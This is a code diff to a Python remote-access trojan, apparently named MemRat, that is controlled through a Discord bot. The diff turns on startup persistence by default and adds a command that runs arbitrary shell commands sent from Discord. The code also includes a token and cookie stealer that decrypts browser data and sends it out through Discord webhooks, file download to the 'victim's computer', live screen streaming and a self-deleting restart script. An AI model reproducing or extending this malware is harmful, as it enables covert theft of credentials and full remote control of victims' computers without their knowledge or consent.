@@ -10,20 +10,24 @@ import json
 import socket
 import shutil
 from threading import Thread
+import psutil
+import subprocess
+from io import StringIO
 
 ############################################################## CONFIG
-defaultStartup = False # If (by default) you want this to insert to startup
-notificationChannel = int("notification-channel-here (INTEGER, REMOVE QUOTES)") # Channel to send the notification that this machine is online to (Channel ID, keep as integer)
+defaultStartup = True # If (by default) you want this to insert to startup
+notificationChannel = int("channel-id-here") # Channel to send the notification that this machine is online to (Channel ID, keep as integer)
 botToken = "bot-token-here" # Put your discord bot's token here
 
 ############################################################## CONFIG
 
-
 # Startup
-
 def settostartup():
     # get path to user's startup directory
     startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+
+    if os.path.isfile(f"{startup_dir}/{__file__}"):
+        return
 
     # get current script's path
     current_path = os.path.abspath(__file__)
@@ -39,31 +43,31 @@ if defaultStartup is True:
 def tokenlogger(defwebhook):
     import sys
     import win32con
-    import browser_cookie3
+    import browser_cookie3 
     from json import loads, dumps
     from base64 import b64decode
     from sqlite3 import connect
     from shutil import copyfile
     from threading import Thread
-    from win32crypt import CryptUnprotectData
-    from Crypto.Cipher import AES
-    from discord_webhook import DiscordEmbed, DiscordWebhook
+    from win32crypt import CryptUnprotectData 
+    from Crypto.Cipher import AES 
+    from discord_webhook import DiscordEmbed, DiscordWebhook 
     from subprocess import Popen, PIPE
     from urllib.request import urlopen, Request
     from requests import get
     from re import findall, search
-    from win32api import SetFileAttributes, GetSystemMetrics
-    from browser_history import get_history
-    from prettytable import PrettyTable
+    from win32api import SetFileAttributes, GetSystemMetrics 
+    from browser_history import get_history 
+    from prettytable import PrettyTable 
     from platform import platform
-    from getmac import get_mac_address as gma
-    from psutil import virtual_memory
+    from getmac import get_mac_address as gma 
+    from psutil import virtual_memory 
     from collections import defaultdict
     from zipfile import ZipFile, ZIP_DEFLATED
-    from cpuinfo import get_cpu_info
+    from cpuinfo import get_cpu_info 
     from multiprocessing import freeze_support
     from tempfile import TemporaryDirectory
-    from pyautogui import screenshot
+    from pyautogui import screenshot 
     from random import choices
     from string import ascii_letters, digits
 
@@ -408,7 +412,7 @@ def getprefix():
     try:
         with open("data.json", "r") as file:
             data = json.load(file)
-    except Exception:
+    except FileNotFoundError:
         data = {
             "prefix": None
         }
@@ -436,7 +440,7 @@ def getdata(dataname):
  
 def startstream(screenheight, screenwidth, refreshtime):
     import cv2
-    import mss
+    import mss 
     import numpy
 
     from flask import render_template, Flask, Response
@@ -516,7 +520,19 @@ def startstream(screenheight, screenwidth, refreshtime):
 
     app.run(host='0.0.0.0', debug=True, use_reloader=False)
 
-prefix = getprefix()
+def clean():
+    if os.path.isfile("crasher.bat"):
+        os.remove("crasher.bat")
+    if os.path.isfile("restarter.bat"):
+        os.remove("restarter.bat")
+    if os.path.isfile("shell.bat"):
+        os.remove("shell.bat")
+    if os.path.isfile("output.wav"):
+        os.remove("output.wav")
+
+prefix = getprefix() # Get the prefix (ip) for the bot
+
+clean() # Clean up unnecessary (and potentially dangerous) files left by MemRat
 
 ########################## discord shit
 bot = commands.Bot(command_prefix=f"{prefix}+", intents = discord.Intents.all())
@@ -580,14 +596,13 @@ async def stealinfo(ctx, * , webhook: str=None):
 
 @bot.command(brief="Downloads a file to the machine")
 async def upload(ctx, url: str=None):
-    filename = mf.GetName(url)
     if url is None:
         await ctx.send("url is missing")
     else:
         file_size = mf.GetFileSize(url)
         await ctx.send(f"Downloading file to victim's computer:\nFile name: {mf.GetName(url)}\nFile size: {mf.AsMegabytes(file_size)} megabytes")
         mf.Download(url)#, output="C:\\Users\\User\\Desktop")
- 
+
 @bot.command(brief="Opens a webpage on the machine")
 async def openweb(ctx, website: str=None):
     if website is None:
@@ -672,6 +687,7 @@ async def size(ctx, path: str=None):
         return
     filesize = os.path.getsize(path)
     await ctx.send(f"{path} is {filesize} megabytes.\n(This thing may be a little broken)")
+    #FIXME: Broken as hell
 
 @bot.command(brief="Shuts down, restarts or Logs the user out of the machine")
 async def shutdown(ctx, choice: str=None):
@@ -692,6 +708,8 @@ async def explorer(ctx, *, path: str="C:/"):
         await ctx.send(os.listdir(path))
     except PermissionError:
         await ctx.send("We don't have permission to that folder")
+    except Exception as e:
+        await ctx.send(f"Something went wrong...\n\n{e}")
 
 @bot.command(brief="Web stream config")
 async def stream(ctx, settingtype=None, option=None, change: int=1):
@@ -751,7 +769,7 @@ async def stream(ctx, settingtype=None, option=None, change: int=1):
     else:
         await ctx.send("That is not a valid stream setting")
 
-@bot.command(brief="Restarts the whole script, only works in compiled form")
+@bot.command(brief="Restarts the whole script")
 async def restart(ctx):
     await ctx.send("**Restarting the script _can_ lead to crashing the whole thing until the victim re-opens the computer**, restarting script now. This may take up to 10 seconds")
     with open("restarter.bat", "w") as file:
@@ -759,8 +777,61 @@ async def restart(ctx):
                     CONSOLESTATE /Hide
                     TIMEOUT 10
                     START {os.path.basename(__file__)}
+                    start /b "" cmd /c del "%~f0"&exit /b
                    """)
     os.startfile("restarter.bat")
     quit()
+
+@bot.command(brief="Works like the task manager")
+async def taskmanager(ctx, process=None, option=None):
+    
+    #TODO: Code a PID lookup and a quit process function
+
+    # Base taskmanager
+    if process is None and option is None:
+        processList = []
+
+        # Iterate over all the running processes and print their details
+        for process in psutil.process_iter():
+            try:
+                process_info = process.as_dict(attrs=['name'])
+            except psutil.NoSuchProcess:
+                pass
+            else:
+                processList.append(process_info["name"])
+
+        processString = '\n'.join(processList)
+        
+        response = f"""
+        Currently running processes:\n
+        {processString}
+        You can exit a process using (IP)+taskmanager (process) quit
+        To get a process PID, use (IP)+taskmanager (process) pid
+        """
+
+        if len(response) > 2000:
+            await ctx.send("Response is too long to be sent as text, sending in as a .txt file")
+            buffer = StringIO(response)
+            f = discord.File(buffer, filename="response.txt")
+            await ctx.send(file=f)
+        else:
+            await ctx.send(response)
+
+@bot.command(brief="Let's you run shell commands and get the output")
+async def runbat(ctx, *, command: str=None):
+    if command is None:
+        await ctx.send("You need to provide a command, separate multiple commands using newline (\ and n)")
+        return
+    with open("shell.bat", "w") as file:
+        file.write(command)
+    output = subprocess.getoutput("shell.bat")
+    os.remove("shell.bat")
+    if len(output) > 2000:
+        await ctx.send("Response is too long to be sent as text, sending in as a .txt file")
+        buffer = StringIO(output)
+        f = discord.File(buffer, filename="response.txt")
+        await ctx.send(file=f)
+    else:
+        await ctx.send(output)
 
 bot.run(botToken)
